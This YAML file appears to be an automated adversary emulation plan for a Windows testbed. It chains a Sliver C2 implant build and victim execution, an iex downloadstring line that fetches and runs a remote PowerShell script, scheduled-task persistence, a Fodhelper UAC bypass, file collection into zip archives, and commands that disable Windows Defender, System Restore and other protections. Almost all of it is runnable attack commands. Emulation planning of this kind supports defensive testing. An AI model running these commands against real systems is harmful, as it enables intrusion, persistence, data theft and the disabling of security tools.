emulation_plan_details:
  adversary_name: '100'
  creation_time: 2025-06-26 19:05:29 UTC+0000
attack_action_sequence:
  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
    name: Build the executable file of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
    arguments:
      HOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - (unallocated ?path - path)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
      - (file_executed_as_root ?f - file ?t - host)
      - ~(unallocated ?path - path)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
    name: WinPwn - PowerSharpPack - Seatbelt
    id:
      - T1082
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - System Information Discovery
    description: |-
      PowerSharpPack - Seatbelt technique via function of WinPwn.

      [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
    execution:
      executor: Powershell Executor
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
        Invoke-Seatbelt -Command "-group=all"
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (system_time_info_known ?target - host)
  - uuid: cf6f614c-83c9-4018-911b-c432bb95acfd
    name: User Context Verification
    id:
      - T1087.001
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - |
        Account Discovery: Local Account
    description: The `whoami` command retrieves the current user identity of the system.
      It executes the command on the remote system and returns the username of the
      account that is currently logged in. This command includes flag for setting
      a timeout.
    execution:
      executor: Sliver Executor
      command: whoami(#{SessionID})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (user_info_known ?t - host)
  - uuid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
    name: Enumerate Active Directory Groups with Get-AdGroup
    id:
      - T1069.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - 'Permission Groups Discovery: Domain Groups'
    description: |
      The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
      Upon successful execution a listing of groups will output with their paths in AD.
      Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
    execution:
      executor: Powershell Executor
      command: |
        Get-AdGroup -Filter *
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (local_permission_groups_info_known ?target - host)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 42f53695-ad4a-4546-abb6-7d837f644a71
    name: Scheduled task Local
    id:
      - T1053.005
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Persistence
      - Privilege Escalation
    technique:
      - 'Scheduled Task/Job: Scheduled Task'
    description: |
      Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
    execution:
      executor: Command Prompt Executor
      command: |
        SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
    arguments:
      task_command:
        description: What you want to execute
        type: string
        default: C:\windows\system32\cmd.exe
      time:
        description: What time 24 Hour
        type: string
        default: 1210
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (command_prompt ?executor - executor ?target - host)
      - (file_exists ?task_command - path ?file - file ?target - host)
      - (exe_file ?file - file)
    effects:
      - (file_execution_at_time ?file - file ?target - host)
  - uuid: f7f31777-1bbf-4ddc-b7a1-af9f46a5299b
    name: Obtain a persistent Sliver Executor
    id:
      - 
    source: Manual
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Persistence
    technique:
      - 
    description: |
      Obtain the persistency of Sliver Executor via scheduled payload file execution.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?f - file)
      - operator: or
        operands:
          - (file_execution_at_time ?f - file ?target - host)
          - (file_execution_at_startup ?f - file ?target - host)
      - (unallocated ?s - executor)
    effects:
      - (persistent_sliver_session ?s - executor ?target - host)
      - ~(unallocated ?s - executor)
  - uuid: 2e8f1a9c-0b5e-4a7c-b6d4-9a8b2d3c5f1e
    name: Create Directory
    id:
      - T1106
    source: Sliver
    supported_platforms:
      - windows
      - linux
    tactics:
      - Persistence
    technique:
      - File System Permissions Modification
    description: The `mkdir` command creates a new directory on the target system.
    execution:
      executor: Sliver Executor
      command: mkdir (#{remote_path},#{SessionID})
    arguments:
      remote_path:
        description: Full path of the directory to create
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?target - host)
          - (os_linux ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (dir_exists ?path - path ?dir - dir ?target - host)
  - uuid: a57fbe4b-3440-452a-88a7-943531ac872a
    name: Zip a Folder with PowerShell for Staging in Temp
    id:
      - T1074.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - 'Data Staged: Local Data Staging'
    description: |
      Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
      was placed in the temp directory.
    execution:
      executor: Powershell Executor
      command: |
        Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
    arguments:
      output_file:
        description: Location to save zipped file or folder
        type: path
        default:
      input_file:
        description: Location of file or folder to zip
        type: path
        default:
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (dir_exists ?input_file - path ?dir - dir ?target - host)
    effects:
      - (dir_data_saved ?dir - dir ?file - file)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: b8cbd2a9-6967-4114-b2b5-162098f74a89
    name: Take Screenshot
    id:
      - T1113
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Collection
    technique:
      - Screen Capture
    description: The `screenshot()` function takes a screenshot of the remote system
      with screenshot data in PNG format.
    execution:
      executor: Sliver Executor
      command: screenshot(#{SessionID})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (screenshot_data_saved ?file - file ?t - host)
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
    name: Search files of interest and save them to a single zip file (Windows)
    id:
      - T1005
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: |
      This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
    execution:
      executor: Powershell Executor
      command: |
        $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
    arguments:
      output_zip_folder_path:
        description: Path to directory for saving the generated zip file
        type: Path
        default: PathToAtomicsFolder\..\ExternalPayloads\T1005
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (certain_extension_data_saved ?file - file ?target - host)
      - (file_exists ?output_zip_folder_path - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: 58f641ea-12e3-499a-b684-44dee46bd182
    name: Bypass UAC using Fodhelper
    id:
      - T1548.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Privilege Escalation
    technique:
      - 'Abuse Elevation Control Mechanism: Bypass User Account Control'
    description: |
      Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
      Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
    execution:
      executor: Command Prompt Executor
      command: |
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
        fodhelper.exe
    arguments:
      executable_binary:
        description: Binary to execute with UAC Bypass
        type: path
        default: C:\Windows\System32\cmd.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?executable_binary - path ?file - file ?target - host)
      - operator: or
        operands:
          - (exe_file ?file - file)
    effects:
      - (file_executed_as_root ?file - file ?target - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45
    name: Tamper with Windows Defender Registry
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
      grayed out and have no info.
    execution:
      executor: Elevated Powershell Executor
      command: |
        Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (windows_defender_disabled ?target - host)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 2a78362e-b79a-4482-8e24-be397bce4d85
    name: Safe Mode Boot
    id:
      - T1562.009
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Safe Mode Boot'
    description: Allows adversaries to abuse safe mode to disable endpoint defenses
      that may not start with limited boot
    execution:
      executor: Elevated Command Prompt Executor
      command: bcdedit /set safeboot network
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (endpoint_defense_disabled ?target - host)
  - uuid: 003f466a-6010-4b15-803a-cbb478a314d7
    name: Disable Windows Toast Notifications
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.
      See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (toast_notification_disabled ?target - host)
  - uuid: 1c68c68d-83a4-4981-974e-8993055fa034
    name: Windows - Disable the SR scheduled task
    id:
      - T1490
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Inhibit System Recovery
    description: |
      Use schtasks.exe to disable the System Restore (SR) scheduled task
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (system_restore_disabled ?target - host)
  - uuid: 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56
    name: Disable Windows Lock Workstation Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
      See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (lock_workstation_disabled ?target - host)
  - uuid: 6b8df440-51ec-4d53-bf83-899591c9b5d7
    name: Tamper with Windows Defender ATP PowerShell
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
      in Windows settings.
    execution:
      executor: Elevated Powershell Executor
      command: |
        Set-MpPreference -DisableRealtimeMonitoring 1
        Set-MpPreference -DisableBehaviorMonitoring 1
        Set-MpPreference -DisableScriptScanning 1
        Set-MpPreference -DisableBlockAtFirstSeen 1
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (virus_and_threat_protection_disabled ?target - host)
  - uuid: 3e757ce7-eca0-411a-9583-1c33b8508d52
    name: Windows HideSCANetwork Group Policy Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
      Take note that some Group Policy changes might require a restart to take effect.
      See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (networking_icon_group_policy_disabled ?target - host)
testbed_requirement:
  host11:
    os: windows
    cve: []
